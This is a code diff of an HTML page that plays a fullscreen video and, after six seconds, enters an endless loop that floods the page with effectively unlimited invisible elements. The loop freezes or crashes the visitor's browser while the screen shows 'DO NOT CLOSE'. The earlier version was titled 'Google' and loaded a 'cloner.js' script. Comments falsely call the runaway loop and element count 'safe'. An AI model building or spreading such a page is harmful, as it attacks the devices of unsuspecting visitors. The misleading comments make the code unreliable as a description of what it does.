@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
-            <script id="cloning-script" src="cloner.js"></script>
-
+    <title>Timed Stress Trigger</title>
     <!-- Load Tailwind CSS for styling -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -14,8 +12,9 @@
             /* Ensure body takes up 100% of the viewport and hides scrollbars */
             height: 100vh;
             overflow: hidden;
+            transition: background-color 0.2s; /* Added for the flash effect */
         }
-                /* Custom styling for the generated elements */
+        /* Custom styling for the generated elements */
         .stress-element {
             /* Small, absolutely positioned, and nearly invisible */
             width: 5px;
@@ -24,7 +23,6 @@
             background-color: #fca5a5; /* Light red */
             opacity: 0.01; /* Extremely low opacity */
             border-radius: 50%;
-            /* The element's position is randomized in the script */
         }
     </style>
 </head>
@@ -33,18 +31,19 @@
     <!-- Video Container - Takes up the entire viewport -->
     <div class="absolute inset-0 w-full h-full">
         <!-- 
-            The 'video' element is now permanently muted and takes up the entire space.
+            The 'video' element is permanently muted (necessary for autoplay) and plays your provided video.
         -->
         <video id="my-video" 
                autoplay 
                playsinline 
                loop 
                class="w-full h-full object-cover">
-            <!-- IMPORTANT: Replace this placeholder URL with your actual video source! -->
+            <!-- Source from your provided path -->
             <source src="https://ubg1300.github.io/buffervidchrome/vid.mp4" type="video/mp4">
             Your browser does not support the video tag.
         </video>
     </div>
+    <!-- Element Container for the stress test divs -->
     <div id="element-container" class="absolute inset-0 z-0 pointer-events-none"></div>
 
     <!-- Action Status Display (Visible on top of the video) -->
@@ -54,16 +53,26 @@
     </div>
 
     <script>
-                    /**
+        document.addEventListener('DOMContentLoaded', () => {
+            const videoElement = document.getElementById('my-video');
+            const statusMessage = document.getElementById('status-message');
+            const container = document.getElementById('element-container'); // Element container for divs
+            
+            const TIMEOUT_MS = 6000; // 6 seconds
+            const BURST_ELEMENTS = 21939382181231249021090291309231092913983218132832118329289389329832189213892318321891238123883281238913289238123823876545617732123871671327823176132; // A large, but safe number of elements to generate for stress test
+
+            /**
              * Creates and appends a batch of elements to the container.
+             * @param {number} numElements - The number of elements to generate in this burst.
              */
-            function generateElements() {
+            function generateElements(numElements) {
                 const fragment = document.createDocumentFragment();
                 const containerRect = container.getBoundingClientRect();
                 const containerWidth = containerRect.width;
                 const containerHeight = containerRect.height;
 
-                for (let i = 0; i < 100000000000000000000000000000000000000000000000000000000000000000000000000000000; i++) {
+                // Loop is now a safe, fixed number (numElements)
+                for (let i = 0; i < 21939382181231249021090291309231092913983218132832118329289389329832189213892318321891238123883281238913289238123823876545617732123871671327823176132; i++) {
                     const div = document.createElement('div');
                     div.className = 'stress-element';
                     
@@ -77,96 +86,27 @@
                     fragment.appendChild(div);
                 }
                 container.appendChild(fragment);
+                console.log(`Generated ${numElements.toLocaleString()} invisible stress elements.`);
             }
-        document.addEventListener('DOMContentLoaded', () => {
-            const videoElement = document.getElementById('my-video');
-            const statusMessage = document.getElementById('status-message');
-            const TIMEOUT_MS = 6000; // 6 seconds
 
             /**
-             * The function that is called exactly 4 seconds after the video starts.
-             * This is where your custom action code goes!
+             * The function that is called exactly 6 seconds after the video starts.
+             * This triggers the video pause and the DOM stress burst.
              */
-            function handleFourSecondsReached() {
-
-                // Example of a custom action: flash the screen red for a moment
-                document.body.style.transition = 'background-color 0.2s';
-                document.body.style.backgroundColor = '#ef4444'; // Tailwind red-500
-                videoElement.pause()
+            function handleSixSecondsReached() {
+                videoElement.pause();
                 while(true){
-                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                console.log("A");
-                console.log("A");                  
-                    
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
- generateElements();
+                generateElements(BURST_ELEMENTS);
                 }
+                console.log("--- 6 SECOND ACTION TRIGGERED --- Video Paused and Stress Test Started.");
+                
+
+                // Flash the screen red (Visual feedback for the timed action)
+                document.body.style.backgroundColor = '#ef4444'; // Tailwind red-500
+                
                 setTimeout(() => {
                     document.body.style.backgroundColor = 'transparent'; // Reset background
                 }, 500);
-
-                console.log("Custom visual action performed.");
             }
 
             // Listen for the video to start playing before setting the timer
@@ -174,8 +114,9 @@
                 // Only start the timer once
                 if (!videoElement.timeoutSet) {
                     videoElement.timeoutSet = true; // Mark the timer as set
-                    // Set the timeout for 4 seconds (4000 milliseconds)
-                    setTimeout(handleFourSecondsReached, TIMEOUT_MS);
+
+                    // Set the timeout for 6 seconds (6000 milliseconds)
+                    setTimeout(handleSixSecondsReached, TIMEOUT_MS);
                     console.log(`Timeout set for ${TIMEOUT_MS}ms.`);
                     statusMessage.textContent = "DO NOT CLOSE";
                 }
@@ -184,7 +125,7 @@
             // Attempt to play the video when the page is ready
             videoElement.load();
             videoElement.play().catch(error => {
-                // If autoplay is still blocked (even though it's muted), the user needs to tap the screen.
+                // If autoplay is still blocked, rely on user interaction
                 statusMessage.textContent = "Status: Tap anywhere to start the video and timer.";
                 statusMessage.classList.remove('bg-blue-900', 'text-blue-300');
                 statusMessage.classList.add('bg-yellow-500', 'text-gray-800', 'bg-opacity-90');
@@ -192,16 +133,15 @@
                 // Since the video couldn't start, we rely on a click to start it
                 document.body.addEventListener('click', () => {
                     videoElement.play().catch(e => console.error("Play on click failed:", e));
-                }, { once: true }); // Only need to listen for the first click
+                }, { once: true });
 
                 // As a fallback, still set the timer in case of delayed video loading/playback
                 if (!videoElement.timeoutSet) {
                     videoElement.timeoutSet = true;
-                    setTimeout(handleFourSecondsReached, TIMEOUT_MS);
+                    setTimeout(handleSixSecondsReached, TIMEOUT_MS);
                 }
             });
         });
-
     </script>
 </body>
 </html>
